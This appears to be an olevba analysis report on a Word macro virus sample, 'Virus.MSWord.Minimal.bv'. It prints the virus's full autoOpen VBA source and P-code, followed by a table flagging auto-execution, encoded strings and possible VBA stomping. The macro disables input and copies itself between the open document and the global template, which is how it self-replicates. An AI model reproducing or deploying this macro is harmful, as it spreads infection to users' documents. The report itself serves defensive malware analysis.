olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Minimal.bv
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Minimal.bv - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO autoOpen.bas 
in file: Virus.MSWord.Minimal.bv - OLE stream: 'Macros/VBA/autoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub MAIN()
a$ = "autoOpen"
b$ = ":" + a$
gl$ = "Global"
c$ = gl$ + ":" + a$
d$ = "." + "DOT"
Dim fm1$
Dim gm1$
Dim Ff1$
Dim Encrypt
On Error GoTo -1: On Error GoTo Go1
WordBasic.FileSummaryInfo Update:=1
WordBasic.DisableInput (1)
WordBasic.DisableAutoMacros (0)
Dim d1 As Object: Set d1 = WordBasic.DialogRecord.FileSummaryInfo(False)
WordBasic.CurValues.FileSummaryInfo d1
fm1$ = d1.Directory + "\" + d1.FileName + b$
gm1$ = c$
Ff1$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 4))
If Ff1$ = d$ Then
Encrypt = WordBasic.IsExecuteOnly(fm1$)
WordBasic.MacroCopy gm1$, fm1$
WordBasic.FileSaveAs Format:=1
Else
WordBasic.MacroCopy fm1$, gm1$
End If
Go1:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Minimal.bv
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/autoOpen - 2164 bytes
' Line #0:
' 	FuncDefn (Public Sub MAIN())
' Line #1:
' 	LitStr 0x0008 "autoOpen"
' 	St a$ 
' Line #2:
' 	LitStr 0x0001 ":"
' 	Ld a$ 
' 	Add 
' 	St B$ 
' Line #3:
' 	LitStr 0x0006 "Global"
' 	St gl$ 
' Line #4:
' 	Ld gl$ 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld a$ 
' 	Add 
' 	St c$ 
' Line #5:
' 	LitStr 0x0001 "."
' 	LitStr 0x0003 "DOT"
' 	Add 
' 	St d$ 
' Line #6:
' 	Dim 
' 	VarDefn fm1
' Line #7:
' 	Dim 
' 	VarDefn gm1
' Line #8:
' 	Dim 
' 	VarDefn Ff1
' Line #9:
' 	Dim 
' 	VarDefn Encrypt
' Line #10:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Go1 
' Line #11:
' 	LitDI2 0x0001 
' 	ParamNamed Update 
' 	Ld WordBasic 
' 	ArgsMemCall FileSummaryInfo 0x0001 
' Line #12:
' 	LitDI2 0x0001 
' 	Paren 
' 	Ld WordBasic 
' 	ArgsMemCall DisableInput 0x0001 
' Line #13:
' 	LitDI2 0x0000 
' 	Paren 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #14:
' 	Dim 
' 	VarDefn d1 (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSummaryInfo 0x0001 
' 	Set d1 
' Line #15:
' 	Ld d1 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSummaryInfo 0x0001 
' Line #16:
' 	Ld d1 
' 	MemLd Directory 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld d1 
' 	MemLd FileName 
' 	Add 
' 	Ld B$ 
' 	Add 
' 	St fm1$ 
' Line #17:
' 	Ld c$ 
' 	St gm1$ 
' Line #18:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroFileName$] 0x0001 
' 	LitDI2 0x0004 
' 	Ld WordBasic 
' 	ArgsMemLd [Right$] 0x0002 
' 	ArgsLd UCase 0x0001 
' 	St Ff1$ 
' Line #19:
' 	Ld Ff1$ 
' 	Ld d$ 
' 	Eq 
' 	IfBlock 
' Line #20:
' 	Ld fm1$ 
' 	Ld WordBasic 
' 	ArgsMemLd IsExecuteOnly 0x0001 
' 	St Encrypt 
' Line #21:
' 	Ld gm1$ 
' 	Ld fm1$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #22:
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #23:
' 	ElseBlock 
' Line #24:
' 	Ld fm1$ 
' 	Ld gm1$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	Label Go1 
' Line #27:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

